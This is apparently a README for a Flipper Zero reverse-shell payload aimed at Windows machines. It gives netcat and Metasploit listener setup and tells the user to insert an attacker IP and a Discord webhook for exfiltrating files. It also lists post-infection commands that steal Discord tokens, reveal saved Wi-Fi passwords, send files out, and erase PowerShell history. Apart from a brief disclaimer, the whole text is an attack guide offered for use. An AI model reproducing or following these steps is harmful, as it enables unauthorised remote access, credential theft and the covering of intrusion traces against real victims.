# Reverse shell for Flipperzero

# Setup

1. listener setup
```
$ nc -nvlp <port_number>
```
or metasploit
```
$ use multi/handler
$ set payload windows/x64/shell/reverse_tcp
$ set lhost <ip address>
$ set lport <port number>
$ run
```

2. Insert the IP address and Port of your listener into the ReverseShell.txt file
3. Insert discord webhook for exfiltrating files to such in the ReverseShell.txt

# Shorten URLs
shorten the url and your webhook in ReverseShell.txt
  - stays in run box char limit
  - faster execution
  - bitly or any service will work

# Disclaimer
I am not responsible for the usage of this utility, it is simply for researching and experimentation for myself. The user, YOU take full responsibility for your actions.

# Have fun!
Additional commands after infection

  /tgrizzly
  - exfiltrates discord tokens and saves them to C:\temp\output.txt

  /wifi
  - shows saved wifi passwords

  /discord (filename)
  - send the file to your discord webhook

  /clean
  - removes powershell history
